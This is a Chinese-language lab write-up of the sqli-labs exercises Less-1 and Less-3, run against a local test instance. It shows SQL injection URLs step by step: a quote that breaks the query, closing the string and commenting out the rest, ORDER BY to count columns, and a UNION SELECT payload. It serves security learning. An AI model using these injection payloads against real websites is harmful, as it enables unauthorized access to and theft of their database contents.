1.找注入点，发现报错的回显

http://127.0.0.1/sqli-labs/Less-1/?id=1%27

看到报错语句：
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1

键入的1已经闭合，后面的内容直接注释–+或者%23 (%23是#的url编码，这里之前想到用#，但是发现并没用，可能是没对#进行url编码。)

http://127.0.0.1/sqli-labs/Less-1/?id=1%27%23

2.接下来猜列数

先来说说Order by，其是对前面的数据进行排序。还有一些细节方面的可以看下https://segmentfault.com/a/1190000002655427

http://127.0.0.1/sqli-labs/Less-1/?id=1%27%20order%20by%203%23

没报错

http://127.0.0.1/sqli-labs/Less-1/?id=1%27%20order%20by%204%23

Unknown column ‘4’ in ‘order clause’

可判断出列数为3

3.使用联合注入

union 联合注入,union 的作用是将两个 sql 语句进行联合。

http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20%20union%20select%201,2,3%23

这里为什么用-1呢？
当 id 的数据在数据库中不存在时,(此时我们可以 id=-1,两个 sql 语句进行联合操作时,当前一个语句选择的内容为空,我们这里就将后面的语句的内容显示出来)此处前台页面返回了我们构造的 union 的数据。

接下来会用到一些数据库的知识https://blog.csdn.net/kikajack/article/details/80065753

Less-3 “Error Based- String(with Twist)”

尝试用’去注入的时候提示
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1

少)，加上会提示

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') LIMIT 0,1' at line 1

闭合了

按照less-1步骤即可拿到数据。
